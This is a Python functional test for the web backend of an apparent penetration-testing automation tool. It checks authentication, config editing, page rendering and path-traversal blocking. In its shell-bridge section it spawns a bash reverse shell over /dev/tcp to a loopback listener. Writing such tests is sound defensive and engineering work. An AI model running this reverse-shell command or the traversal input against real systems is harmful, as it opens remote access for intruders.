#!/usr/bin/env python3
# Functional test for the web backend. Launches the REAL uvicorn server as a
# subprocess (faithful to deployment), spawns a fast no-network bash phase via
# the API, asserts the WebSocket streams to completion, the artifact lands on
# disk, and the file API rejects path traversal.
import asyncio
import json
import shutil
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

import websockets

ROOT = Path(__file__).resolve().parent.parent
TOKEN = "test-token-123"
TARGET = "10.10.10.77"

passed = failed = 0
def check(name, cond):
    global passed, failed
    print(f"  {'PASS' if cond else 'FAIL'}  {name}")
    passed += bool(cond); failed += (not cond)

def free_port():
    s = socket.socket(); s.bind(("127.0.0.1", 0)); p = s.getsockname()[1]; s.close(); return p

def req(method, path, token=TOKEN, body=None):
    url = f"http://127.0.0.1:{PORT}{path}"
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, method=method)
    if token:
        r.add_header("X-AR-Token", token)
    if data:
        r.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(r, timeout=30) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

PORT = free_port()
shutil.rmtree(ROOT / "results" / TARGET, ignore_errors=True)
# preserve any real user_config.sh so the config test never clobbers it
_uc = ROOT / "config" / "user_config.sh"
_uc_backup = _uc.read_bytes() if _uc.is_file() else None
srv = subprocess.Popen(
    [sys.executable, str(ROOT / "web" / "server.py"), "--host", "127.0.0.1",
     "--port", str(PORT), "--token", TOKEN],
    cwd=str(ROOT), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
)

async def stream_job(job_id):
    lines = []
    uri = f"ws://127.0.0.1:{PORT}/ws/jobs/{job_id}?token={TOKEN}"
    async with websockets.connect(uri, max_size=None) as ws:
        try:
            while True:
                m = await asyncio.wait_for(ws.recv(), timeout=60)
                lines.append(m)
                if m.startswith("__JOB_END__"):
                    break
        except asyncio.TimeoutError:
            pass
    return lines

try:
    # wait for server up
    up = False
    for _ in range(60):
        try:
            if req("GET", "/api/health", token=None)[0] == 200:
                up = True; break
        except Exception:
            pass
        time.sleep(0.25)
    check("server started", up)

    check("scan rejects missing token", req("POST", "/api/scan", token=None, body={"target": TARGET, "action": "pivot"})[0] == 401)
    check("invalid target rejected", req("POST", "/api/scan", body={"target": "bad target", "action": "pivot"})[0] == 400)

    st, bd = req("POST", "/api/scan", body={"target": TARGET, "action": "pivot", "profile": "htb"})
    check("scan accepted", st == 200)
    job_id = json.loads(bd)["job_id"]

    lines = asyncio.run(stream_job(job_id))
    check("ws streamed lines", len(lines) > 1)
    check("ws reached job end", any(l.startswith("__JOB_END__") for l in lines))
    check("job end status done", any("status=done" in l for l in lines if l.startswith("__JOB_END__")))
    check("pivot artifact on disk", (ROOT / "results" / TARGET / "pivot" / "tunnel_cheatsheet.txt").is_file())

    tl = json.loads(req("GET", "/api/targets")[1])["targets"]
    check("target listed", any(t["name"] == TARGET for t in tl))
    fl = json.loads(req("GET", f"/api/targets/{TARGET}/files")[1])["files"]
    check("files listed", any("tunnel_cheatsheet" in f["path"] for f in fl))
    st, bd = req("GET", f"/api/targets/{TARGET}/file?path=pivot/tunnel_cheatsheet.txt")
    check("file read ok", st == 200 and "Tunneling" in bd)
    check("path traversal blocked", req("GET", f"/api/targets/{TARGET}/file?path=../../etc/passwd")[0] == 400)

    # 8b) phase-state endpoint reflects the pivot run
    ph = json.loads(req("GET", f"/api/targets/{TARGET}/phases")[1])["phases"]
    check("phases endpoint returns pivot completed", any(p["phase"] == "pivot" and p["status"] == "completed" for p in ph))

    # 8c) summary endpoint (no report yet → empty but well-formed)
    summ = json.loads(req("GET", f"/api/targets/{TARGET}/summary")[1])
    check("summary has severity keys", set(summ.get("severity", {})) == {"CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"})

    # 8d) editable config: GET schema, POST override, verify, reset
    cfg = json.loads(req("GET", "/api/config")[1])
    check("config schema present", len(cfg.get("schema", [])) > 5 and "SCAN_METHOD" in cfg.get("values", {}))
    check("config rejects bad value", req("POST", "/api/config", body={"SCAN_METHOD": "bogus"})[0] == 400)
    st, bd = req("POST", "/api/config", body={"THREADS": "77", "DRY_RUN": "true"})
    check("config save ok", st == 200 and json.loads(bd)["values"]["THREADS"] == "77")
    uc = ROOT / "config" / "user_config.sh"
    check("user_config.sh written", uc.is_file() and "THREADS=77" in uc.read_text())
    check("config reset ok", req("POST", "/api/config/reset")[0] == 200 and not uc.is_file())

    # 9) page routes render (need templates + auth cookie via ?token=)
    for path in ["/?token=" + TOKEN, "/results", "/shell", "/settings",
                 "/phase/pivot", "/phase/ad_enum", f"/scan/{job_id}"]:
        code = req("GET", path)[0]
        check(f"page renders {path.split('?')[0]}", code in (200, 307))

    # 10) shell bridge — catch a real loopback reverse shell and run a command
    sp = free_port()
    check("shell listen ok", req("POST", "/api/shell/listen", body={"port": sp})[0] == 200)
    subprocess.Popen(["bash", "-c", f"bash -i >& /dev/tcp/127.0.0.1/{sp} 0>&1"],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    async def shell_probe():
        uri = f"ws://127.0.0.1:{PORT}/ws/shell?token={TOKEN}"
        got = []
        async with websockets.connect(uri, max_size=None) as ws:
            await asyncio.sleep(0.6)
            await ws.send("echo AR_WEB_SHELL_OK")
            try:
                for _ in range(40):
                    got.append(await asyncio.wait_for(ws.recv(), timeout=8))
                    if any("AR_WEB_SHELL_OK" in g for g in got):
                        break
            except asyncio.TimeoutError:
                pass
        return got
    out = asyncio.run(shell_probe())
    check("shell command echoed back", any("AR_WEB_SHELL_OK" in l for l in out))
    st = json.loads(req("GET", "/api/shell/status")[1])
    check("shell status connected", st.get("connected") is True)
finally:
    srv.terminate()
    try:
        srv.wait(timeout=5)
    except Exception:
        srv.kill()
    shutil.rmtree(ROOT / "results" / TARGET, ignore_errors=True)
    if _uc_backup is not None:
        _uc.write_bytes(_uc_backup)   # restore the user's real config
    else:
        _uc.unlink(missing_ok=True)

print(f"\nweb backend: {passed} passed, {failed} failed")
sys.exit(1 if failed else 0)
